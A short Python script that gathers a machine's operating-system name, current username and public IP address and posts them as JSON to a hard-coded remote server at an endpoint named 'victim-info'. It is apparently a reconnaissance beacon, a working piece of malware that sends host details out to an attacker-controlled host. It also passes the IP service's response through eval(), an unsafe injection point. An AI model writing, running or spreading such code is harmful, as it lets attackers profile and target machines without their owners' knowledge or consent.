import os
import json
import urllib
import platform
import subprocess
from urllib import request, error


def get_os_name():
    os_name = platform.system()

    if os_name == "Windows":
        try:
            result = subprocess.run(['systeminfo'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                    check=True)
            output = result.stdout
            for line in output.split('\n'):
                if "OS Name" in line:
                    return line.split(":", 1)[1].strip()
        except subprocess.CalledProcessError as e:
            return f"Error retrieving OS information: {e}"
    elif os_name == "Linux":
        try:
            result = subprocess.run(['lsb_release', '-d'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                    check=True)
            output = result.stdout
            return output.split(":", 1)[1].strip()
        except subprocess.CalledProcessError as e:
            return f"Error retrieving OS information: {e}"
    elif os_name == "Darwin":
        try:
            result = subprocess.run(['sw_vers', '-productName'], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    text=True, check=True)
            product_name = result.stdout.strip()
            result = subprocess.run(['sw_vers', '-productVersion'], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    text=True, check=True)
            product_version = result.stdout.strip()
            return f"{product_name} {product_version}"
        except subprocess.CalledProcessError as e:
            return f"Error retrieving OS information: {e}"
    else:
        return f"Unsupported OS: {os_name}"


def get_current_user():
    try:
        user = os.popen('whoami').read().strip()
        return user
    except Exception as e:
        return f"Error retrieving current user: {e}"


def get_public_ip():
    try:
        with urllib.request.urlopen("http://api.ipify.org?format=json") as response:
            ip_data = response.read()
            ip_data = ip_data.decode('utf-8')
            public_ip = eval(ip_data)["ip"]
    except Exception as e:
        public_ip = f"Cannot get the public IP address: {e}"
    return public_ip


def get_info():
    json_obj = {
        'OS': get_os_name(),
        'Host': get_current_user(),
        'IP': get_public_ip()
    }
    headers = {
        'content-type': 'application/json'
    }

    url = 'http://51.20.32.129:5000/victim-info'
    req = urllib.request.Request(url, data=json.dumps(json_obj).encode('utf-8'), headers=headers)

    try:
        with urllib.request.urlopen(req) as response:
            response_data = response.read().decode('utf-8')
            print("Response from server:", json.loads(response_data))
    except urllib.error.URLError as e:
        print("Failed to send request:", e)


if __name__ == '__main__':
    get_info()
